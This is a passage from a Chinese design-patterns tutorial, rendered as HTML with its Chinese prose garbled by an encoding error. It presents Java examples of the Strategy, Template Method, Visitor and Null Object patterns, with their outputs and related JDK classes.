<p>ç­–ç•¥æ¨¡å¼å¯ä»¥è®©ç®—æ³•ç‹¬ç«‹äºä½¿ç”¨å®ƒçš„å®¢æˆ·ç«¯ã€‚</p>
<h3 id="class-diagram-14" tabindex="-1"> Class Diagram</h3>
<ul>
<li>Strategy æ¥å£å®šä¹‰äº†ä¸€ä¸ªç®—æ³•æ—ï¼Œå®ƒä»¬éƒ½å®ç°äº†  behavior() æ–¹æ³•ã€‚</li>
<li>Context æ˜¯ä½¿ç”¨åˆ°è¯¥ç®—æ³•æ—çš„ç±»ï¼Œå…¶ä¸­çš„ doSomething() æ–¹æ³•ä¼šè°ƒç”¨ behavior()ï¼ŒsetStrategy(Strategy) æ–¹æ³•å¯ä»¥åŠ¨æ€åœ°æ”¹å˜ strategy å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯è¯´èƒ½åŠ¨æ€åœ°æ”¹å˜ Context æ‰€ä½¿ç”¨çš„ç®—æ³•ã€‚</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/cd1be8c2-755a-4a66-ad92-2e30f8f47922.png"/> </div><br>
<h3 id="ä¸çŠ¶æ€æ¨¡å¼çš„æ¯”è¾ƒ" tabindex="-1"> ä¸çŠ¶æ€æ¨¡å¼çš„æ¯”è¾ƒ</h3>
<p>çŠ¶æ€æ¨¡å¼çš„ç±»å›¾å’Œç­–ç•¥æ¨¡å¼ç±»ä¼¼ï¼Œå¹¶ä¸”éƒ½æ˜¯èƒ½å¤ŸåŠ¨æ€æ”¹å˜å¯¹è±¡çš„è¡Œä¸ºã€‚ä½†æ˜¯çŠ¶æ€æ¨¡å¼æ˜¯é€šè¿‡çŠ¶æ€è½¬ç§»æ¥æ”¹å˜ Context æ‰€ç»„åˆçš„ State å¯¹è±¡ï¼Œè€Œç­–ç•¥æ¨¡å¼æ˜¯é€šè¿‡ Context æœ¬èº«çš„å†³ç­–æ¥æ”¹å˜ç»„åˆçš„ Strategy å¯¹è±¡ã€‚æ‰€è°“çš„çŠ¶æ€è½¬ç§»ï¼Œæ˜¯æŒ‡ Context åœ¨è¿è¡Œè¿‡ç¨‹ä¸­ç”±äºä¸€äº›æ¡ä»¶å‘ç”Ÿæ”¹å˜è€Œä½¿å¾— State å¯¹è±¡å‘ç”Ÿæ”¹å˜ï¼Œæ³¨æ„å¿…é¡»è¦æ˜¯åœ¨è¿è¡Œè¿‡ç¨‹ä¸­ã€‚</p>
<p>çŠ¶æ€æ¨¡å¼ä¸»è¦æ˜¯ç”¨æ¥è§£å†³çŠ¶æ€è½¬ç§»çš„é—®é¢˜ï¼Œå½“çŠ¶æ€å‘ç”Ÿè½¬ç§»äº†ï¼Œé‚£ä¹ˆ Context å¯¹è±¡å°±ä¼šæ”¹å˜å®ƒçš„è¡Œä¸ºï¼›è€Œç­–ç•¥æ¨¡å¼ä¸»è¦æ˜¯ç”¨æ¥å°è£…ä¸€ç»„å¯ä»¥äº’ç›¸æ›¿ä»£çš„ç®—æ³•æ—ï¼Œå¹¶ä¸”å¯ä»¥æ ¹æ®éœ€è¦åŠ¨æ€åœ°å»æ›¿æ¢ Context ä½¿ç”¨çš„ç®—æ³•ã€‚</p>
<h3 id="implementation-14" tabindex="-1"> Implementation</h3>
<p>è®¾è®¡ä¸€ä¸ªé¸­å­ï¼Œå®ƒå¯ä»¥åŠ¨æ€åœ°æ”¹å˜å«å£°ã€‚è¿™é‡Œçš„ç®—æ³•æ—æ˜¯é¸­å­çš„å«å£°è¡Œä¸ºã€‚</p>
<div><pre><code><span>public</span> <span>interface</span> <span>QuackBehavior</span> <span>{</span>
    <span>void</span> <span>quack</span><span>(</span><span>)</span><span>;</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>Quack</span> <span>implements</span> <span>QuackBehavior</span> <span>{</span>
    <span>@Override</span>
    <span>public</span> <span>void</span> <span>quack</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"quack!"</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>Squeak</span> <span>implements</span> <span>QuackBehavior</span><span>{</span>
    <span>@Override</span>
    <span>public</span> <span>void</span> <span>quack</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"squeak!"</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>Duck</span> <span>{</span>

    <span>private</span> <span>QuackBehavior</span> quackBehavior<span>;</span>

    <span>public</span> <span>void</span> <span>performQuack</span><span>(</span><span>)</span> <span>{</span>
        <span>if</span> <span>(</span>quackBehavior <span>!=</span> <span>null</span><span>)</span> <span>{</span>
            quackBehavior<span>.</span><span>quack</span><span>(</span><span>)</span><span>;</span>
        <span>}</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>setQuackBehavior</span><span>(</span><span>QuackBehavior</span> quackBehavior<span>)</span> <span>{</span>
        <span>this</span><span>.</span>quackBehavior <span>=</span> quackBehavior<span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Client</span> <span>{</span>

    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
        <span>Duck</span> duck <span>=</span> <span>new</span> <span>Duck</span><span>(</span><span>)</span><span>;</span>
        duck<span>.</span><span>setQuackBehavior</span><span>(</span><span>new</span> <span>Squeak</span><span>(</span><span>)</span><span>)</span><span>;</span>
        duck<span>.</span><span>performQuack</span><span>(</span><span>)</span><span>;</span>
        duck<span>.</span><span>setQuackBehavior</span><span>(</span><span>new</span> <span>Quack</span><span>(</span><span>)</span><span>)</span><span>;</span>
        duck<span>.</span><span>performQuack</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><div><pre><code>squeak!
quack!
</code></pre></div><h3 id="jdk-12" tabindex="-1"> JDK</h3>
<ul>
<li>java.util.Comparator#compare()</li>
<li>javax.servlet.http.HttpServlet</li>
<li>javax.servlet.Filter#doFilter()</li>
</ul>
<h2 id="_10-æ¨¡æ¿æ–¹æ³•-template-method" tabindex="-1"> 10. æ¨¡æ¿æ–¹æ³•ï¼ˆTemplate Methodï¼‰</h2>
<h3 id="intent-15" tabindex="-1"> Intent</h3>
<p>å®šä¹‰ç®—æ³•æ¡†æ¶ï¼Œå¹¶å°†ä¸€äº›æ­¥éª¤çš„å®ç°å»¶è¿Ÿåˆ°å­ç±»ã€‚</p>
<p>é€šè¿‡æ¨¡æ¿æ–¹æ³•ï¼Œå­ç±»å¯ä»¥é‡æ–°å®šä¹‰ç®—æ³•çš„æŸäº›æ­¥éª¤ï¼Œè€Œä¸ç”¨æ”¹å˜ç®—æ³•çš„ç»“æ„ã€‚</p>
<h3 id="class-diagram-15" tabindex="-1"> Class Diagram</h3>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/ac6a794b-68c0-486c-902f-8d988eee5766.png"/> </div><br>
<h3 id="implementation-15" tabindex="-1"> Implementation</h3>
<p>å†²å’–å•¡å’Œå†²èŒ¶éƒ½æœ‰ç±»ä¼¼çš„æµç¨‹ï¼Œä½†æ˜¯æŸäº›æ­¥éª¤ä¼šæœ‰ç‚¹ä¸ä¸€æ ·ï¼Œè¦æ±‚å¤ç”¨é‚£äº›ç›¸åŒæ­¥éª¤çš„ä»£ç ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/11236498-1417-46ce-a1b0-e10054256955.png"/> </div><br>
<div><pre><code><span>public</span> <span>abstract</span> <span>class</span> <span>CaffeineBeverage</span> <span>{</span>

    <span>final</span> <span>void</span> <span>prepareRecipe</span><span>(</span><span>)</span> <span>{</span>
        <span>boilWater</span><span>(</span><span>)</span><span>;</span>
        <span>brew</span><span>(</span><span>)</span><span>;</span>
        <span>pourInCup</span><span>(</span><span>)</span><span>;</span>
        <span>addCondiments</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>

    <span>abstract</span> <span>void</span> <span>brew</span><span>(</span><span>)</span><span>;</span>

    <span>abstract</span> <span>void</span> <span>addCondiments</span><span>(</span><span>)</span><span>;</span>

    <span>void</span> <span>boilWater</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"boilWater"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>void</span> <span>pourInCup</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"pourInCup"</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Coffee</span> <span>extends</span> <span>CaffeineBeverage</span> <span>{</span>
    <span>@Override</span>
    <span>void</span> <span>brew</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Coffee.brew"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>void</span> <span>addCondiments</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Coffee.addCondiments"</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Tea</span> <span>extends</span> <span>CaffeineBeverage</span> <span>{</span>
    <span>@Override</span>
    <span>void</span> <span>brew</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Tea.brew"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>void</span> <span>addCondiments</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Tea.addCondiments"</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Client</span> <span>{</span>
    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
        <span>CaffeineBeverage</span> caffeineBeverage <span>=</span> <span>new</span> <span>Coffee</span><span>(</span><span>)</span><span>;</span>
        caffeineBeverage<span>.</span><span>prepareRecipe</span><span>(</span><span>)</span><span>;</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"-----------"</span><span>)</span><span>;</span>
        caffeineBeverage <span>=</span> <span>new</span> <span>Tea</span><span>(</span><span>)</span><span>;</span>
        caffeineBeverage<span>.</span><span>prepareRecipe</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div><div><pre><code>boilWater
Coffee.brew
pourInCup
Coffee.addCondiments
-----------
boilWater
Tea.brew
pourInCup
Tea.addCondiments
</code></pre></div><h3 id="jdk-13" tabindex="-1"> JDK</h3>
<ul>
<li>java.util.Collections#sort()</li>
<li>java.io.InputStream#skip()</li>
<li>java.io.InputStream#read()</li>
<li>java.util.AbstractList#indexOf()</li>
</ul>
<h2 id="_11-è®¿é—®è€…-visitor" tabindex="-1"> 11. è®¿é—®è€…ï¼ˆVisitorï¼‰</h2>
<h3 id="intent-16" tabindex="-1"> Intent</h3>
<p>ä¸ºä¸€ä¸ªå¯¹è±¡ç»“æ„ï¼ˆæ¯”å¦‚ç»„åˆç»“æ„ï¼‰å¢åŠ æ–°èƒ½åŠ›ã€‚</p>
<h3 id="class-diagram-16" tabindex="-1"> Class Diagram</h3>
<ul>
<li>Visitorï¼šè®¿é—®è€…ï¼Œä¸ºæ¯ä¸€ä¸ª ConcreteElement å£°æ˜ä¸€ä¸ª visit æ“ä½œ</li>
<li>ConcreteVisitorï¼šå…·ä½“è®¿é—®è€…ï¼Œå­˜å‚¨éå†è¿‡ç¨‹ä¸­çš„ç´¯è®¡ç»“æœ</li>
<li>ObjectStructureï¼šå¯¹è±¡ç»“æ„ï¼Œå¯ä»¥æ˜¯ç»„åˆç»“æ„ï¼Œæˆ–è€…æ˜¯ä¸€ä¸ªé›†åˆã€‚</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/79c6f036-bde6-4393-85a3-ef36a0327bd2.png"/> </div><br>
<h3 id="implementation-16" tabindex="-1"> Implementation</h3>
<div><pre><code><span>public</span> <span>interface</span> <span>Element</span> <span>{</span>
    <span>void</span> <span>accept</span><span>(</span><span>Visitor</span> visitor<span>)</span><span>;</span>
<span>}</span>
</code></pre></div><div><pre><code><span>class</span> <span>CustomerGroup</span> <span>{</span>

    <span>private</span> <span>List</span><span><span>&lt;</span><span>Customer</span><span>></span></span> customers <span>=</span> <span>new</span> <span>ArrayList</span><span><span>&lt;</span><span>></span></span><span>(</span><span>)</span><span>;</span>

    <span>void</span> <span>accept</span><span>(</span><span>Visitor</span> visitor<span>)</span> <span>{</span>
        <span>for</span> <span>(</span><span>Customer</span> customer <span>:</span> customers<span>)</span> <span>{</span>
            customer<span>.</span><span>accept</span><span>(</span>visitor<span>)</span><span>;</span>
        <span>}</span>
    <span>}</span>

    <span>void</span> <span>addCustomer</span><span>(</span><span>Customer</span> customer<span>)</span> <span>{</span>
        customers<span>.</span><span>add</span><span>(</span>customer<span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Customer</span> <span>implements</span> <span>Element</span> <span>{</span>

    <span>private</span> <span>String</span> name<span>;</span>
    <span>private</span> <span>List</span><span><span>&lt;</span><span>Order</span><span>></span></span> orders <span>=</span> <span>new</span> <span>ArrayList</span><span><span>&lt;</span><span>></span></span><span>(</span><span>)</span><span>;</span>

    <span>Customer</span><span>(</span><span>String</span> name<span>)</span> <span>{</span>
        <span>this</span><span>.</span>name <span>=</span> name<span>;</span>
    <span>}</span>

    <span>String</span> <span>getName</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> name<span>;</span>
    <span>}</span>

    <span>void</span> <span>addOrder</span><span>(</span><span>Order</span> order<span>)</span> <span>{</span>
        orders<span>.</span><span>add</span><span>(</span>order<span>)</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>accept</span><span>(</span><span>Visitor</span> visitor<span>)</span> <span>{</span>
        visitor<span>.</span><span>visit</span><span>(</span><span>this</span><span>)</span><span>;</span>
        <span>for</span> <span>(</span><span>Order</span> order <span>:</span> orders<span>)</span> <span>{</span>
            order<span>.</span><span>accept</span><span>(</span>visitor<span>)</span><span>;</span>
        <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Order</span> <span>implements</span> <span>Element</span> <span>{</span>

    <span>private</span> <span>String</span> name<span>;</span>
    <span>private</span> <span>List</span><span><span>&lt;</span><span>Item</span><span>></span></span> items <span>=</span> <span>new</span> <span>ArrayList</span><span>(</span><span>)</span><span>;</span>

    <span>Order</span><span>(</span><span>String</span> name<span>)</span> <span>{</span>
        <span>this</span><span>.</span>name <span>=</span> name<span>;</span>
    <span>}</span>

    <span>Order</span><span>(</span><span>String</span> name<span>,</span> <span>String</span> itemName<span>)</span> <span>{</span>
        <span>this</span><span>.</span>name <span>=</span> name<span>;</span>
        <span>this</span><span>.</span><span>addItem</span><span>(</span><span>new</span> <span>Item</span><span>(</span>itemName<span>)</span><span>)</span><span>;</span>
    <span>}</span>

    <span>String</span> <span>getName</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> name<span>;</span>
    <span>}</span>

    <span>void</span> <span>addItem</span><span>(</span><span>Item</span> item<span>)</span> <span>{</span>
        items<span>.</span><span>add</span><span>(</span>item<span>)</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>accept</span><span>(</span><span>Visitor</span> visitor<span>)</span> <span>{</span>
        visitor<span>.</span><span>visit</span><span>(</span><span>this</span><span>)</span><span>;</span>

        <span>for</span> <span>(</span><span>Item</span> item <span>:</span> items<span>)</span> <span>{</span>
            item<span>.</span><span>accept</span><span>(</span>visitor<span>)</span><span>;</span>
        <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Item</span> <span>implements</span> <span>Element</span> <span>{</span>

    <span>private</span> <span>String</span> name<span>;</span>

    <span>Item</span><span>(</span><span>String</span> name<span>)</span> <span>{</span>
        <span>this</span><span>.</span>name <span>=</span> name<span>;</span>
    <span>}</span>

    <span>String</span> <span>getName</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> name<span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>accept</span><span>(</span><span>Visitor</span> visitor<span>)</span> <span>{</span>
        visitor<span>.</span><span>visit</span><span>(</span><span>this</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br></div></div><div><pre><code><span>public</span> <span>interface</span> <span>Visitor</span> <span>{</span>
    <span>void</span> <span>visit</span><span>(</span><span>Customer</span> customer<span>)</span><span>;</span>

    <span>void</span> <span>visit</span><span>(</span><span>Order</span> order<span>)</span><span>;</span>

    <span>void</span> <span>visit</span><span>(</span><span>Item</span> item<span>)</span><span>;</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>GeneralReport</span> <span>implements</span> <span>Visitor</span> <span>{</span>

    <span>private</span> <span>int</span> customersNo<span>;</span>
    <span>private</span> <span>int</span> ordersNo<span>;</span>
    <span>private</span> <span>int</span> itemsNo<span>;</span>

    <span>public</span> <span>void</span> <span>visit</span><span>(</span><span>Customer</span> customer<span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span>customer<span>.</span><span>getName</span><span>(</span><span>)</span><span>)</span><span>;</span>
        customersNo<span>++</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>visit</span><span>(</span><span>Order</span> order<span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span>order<span>.</span><span>getName</span><span>(</span><span>)</span><span>)</span><span>;</span>
        ordersNo<span>++</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>visit</span><span>(</span><span>Item</span> item<span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span>item<span>.</span><span>getName</span><span>(</span><span>)</span><span>)</span><span>;</span>
        itemsNo<span>++</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>displayResults</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Number of customers: "</span> <span>+</span> customersNo<span>)</span><span>;</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Number of orders:    "</span> <span>+</span> ordersNo<span>)</span><span>;</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Number of items:     "</span> <span>+</span> itemsNo<span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Client</span> <span>{</span>
    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
        <span>Customer</span> customer1 <span>=</span> <span>new</span> <span>Customer</span><span>(</span><span>"customer1"</span><span>)</span><span>;</span>
        customer1<span>.</span><span>addOrder</span><span>(</span><span>new</span> <span>Order</span><span>(</span><span>"order1"</span><span>,</span> <span>"item1"</span><span>)</span><span>)</span><span>;</span>
        customer1<span>.</span><span>addOrder</span><span>(</span><span>new</span> <span>Order</span><span>(</span><span>"order2"</span><span>,</span> <span>"item1"</span><span>)</span><span>)</span><span>;</span>
        customer1<span>.</span><span>addOrder</span><span>(</span><span>new</span> <span>Order</span><span>(</span><span>"order3"</span><span>,</span> <span>"item1"</span><span>)</span><span>)</span><span>;</span>

        <span>Order</span> order <span>=</span> <span>new</span> <span>Order</span><span>(</span><span>"order_a"</span><span>)</span><span>;</span>
        order<span>.</span><span>addItem</span><span>(</span><span>new</span> <span>Item</span><span>(</span><span>"item_a1"</span><span>)</span><span>)</span><span>;</span>
        order<span>.</span><span>addItem</span><span>(</span><span>new</span> <span>Item</span><span>(</span><span>"item_a2"</span><span>)</span><span>)</span><span>;</span>
        order<span>.</span><span>addItem</span><span>(</span><span>new</span> <span>Item</span><span>(</span><span>"item_a3"</span><span>)</span><span>)</span><span>;</span>
        <span>Customer</span> customer2 <span>=</span> <span>new</span> <span>Customer</span><span>(</span><span>"customer2"</span><span>)</span><span>;</span>
        customer2<span>.</span><span>addOrder</span><span>(</span>order<span>)</span><span>;</span>

        <span>CustomerGroup</span> customers <span>=</span> <span>new</span> <span>CustomerGroup</span><span>(</span><span>)</span><span>;</span>
        customers<span>.</span><span>addCustomer</span><span>(</span>customer1<span>)</span><span>;</span>
        customers<span>.</span><span>addCustomer</span><span>(</span>customer2<span>)</span><span>;</span>

        <span>GeneralReport</span> visitor <span>=</span> <span>new</span> <span>GeneralReport</span><span>(</span><span>)</span><span>;</span>
        customers<span>.</span><span>accept</span><span>(</span>visitor<span>)</span><span>;</span>
        visitor<span>.</span><span>displayResults</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br></div></div><div><pre><code>customer1
order1
item1
order2
item1
order3
item1
customer2
order_a
item_a1
item_a2
item_a3
Number of customers: 2
Number of orders:    4
Number of items:     6
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br></div></div><h3 id="jdk-14" tabindex="-1"> JDK</h3>
<ul>
<li>javax.lang.model.element.Element and javax.lang.model.element.ElementVisitor</li>
<li>javax.lang.model.type.TypeMirror and javax.lang.model.type.TypeVisitor</li>
</ul>
<h2 id="_12-ç©ºå¯¹è±¡-null" tabindex="-1"> 12. ç©ºå¯¹è±¡ï¼ˆNullï¼‰</h2>
<h3 id="intent-17" tabindex="-1"> Intent</h3>
<p>ä½¿ç”¨ä»€ä¹ˆéƒ½ä¸åšçš„ç©ºå¯¹è±¡æ¥ä»£æ›¿ NULLã€‚</p>
<p>ä¸€ä¸ªæ–¹æ³•è¿”å› NULLï¼Œæ„å‘³ç€æ–¹æ³•çš„è°ƒç”¨ç«¯éœ€è¦å»æ£€æŸ¥è¿”å›å€¼æ˜¯å¦æ˜¯ NULLï¼Œè¿™ä¹ˆåšä¼šå¯¼è‡´éå¸¸å¤šçš„å†—ä½™çš„æ£€æŸ¥ä»£ç ã€‚å¹¶ä¸”å¦‚æœæŸä¸€ä¸ªè°ƒç”¨ç«¯å¿˜è®°äº†åšè¿™ä¸ªæ£€æŸ¥è¿”å›å€¼ï¼Œè€Œç›´æ¥ä½¿ç”¨è¿”å›çš„å¯¹è±¡ï¼Œé‚£ä¹ˆå°±æœ‰å¯èƒ½æŠ›å‡ºç©ºæŒ‡é’ˆå¼‚å¸¸ã€‚</p>
<h3 id="class-diagram-17" tabindex="-1"> Class Diagram</h3>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/22870bbe-898f-4c17-a31a-d7c5ee5d1c10.png"/> </div><br>
<h3 id="implementation-17" tabindex="-1"> Implementation</h3>
<div><pre><code><span>public</span> <span>abstract</span> <span>class</span> <span>AbstractOperation</span> <span>{</span>
    <span>abstract</span> <span>void</span> <span>request</span><span>(</span><span>)</span><span>;</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>RealOperation</span> <span>extends</span> <span>AbstractOperation</span> <span>{</span>
    <span>@Override</span>
    <span>void</span> <span>request</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"do something"</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>NullOperation</span> <span>extends</span> <span>AbstractOperation</span><span>{</span>
    <span>@Override</span>
    <span>void</span> <span>request</span><span>(</span><span>)</span> <span>{</span>
        <span>// do nothing</span>
    <span>}</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>Client</span> <span>{</span>
    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
        <span>AbstractOperation</span> abstractOperation <span>=</span> <span>func</span><span>(</span><span>-</span><span>1</span><span>)</span><span>;</span>
        abstractOperation<span>.</span><span>request</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>static</span> <span>AbstractOperation</span> <span>func</span><span>(</span><span>int</span> para<span>)</span> <span>{</span>
        <span>if</span> <span>(</span>para <span>&lt;</span> <span>0</span><span>)</span> <span>{</span>
            <span>return</span> <span>new</span> <span>NullOperation</span><span>(</span><span>)</span><span>;</span>
        <span>}</span>
        <span>return</span> <span>new</span> <span>RealOperation</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></div></div><h1 id="å››ã€ç»“æ„å‹" tabindex="-1"> å››ã€ç»“æ„å‹</h1>
<h2 id="_1-é€‚é…å™¨-adapter" tabindex="-1"> 1. é€‚é…å™¨ï¼ˆAdapterï¼‰</h2>
<h3 id="intent-18" tabindex="-1"> Intent</h3>
<p>æŠŠä¸€ä¸ªç±»æ¥å£è½¬æ¢æˆå¦ä¸€ä¸ªç”¨æˆ·éœ€è¦çš„æ¥å£ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/3d5b828e-5c4d-48d8-a440-281e4a8e1c92.png"/> </div><br>
<h3 id="class-diagram-18" tabindex="-1"> Class Diagram</h3>
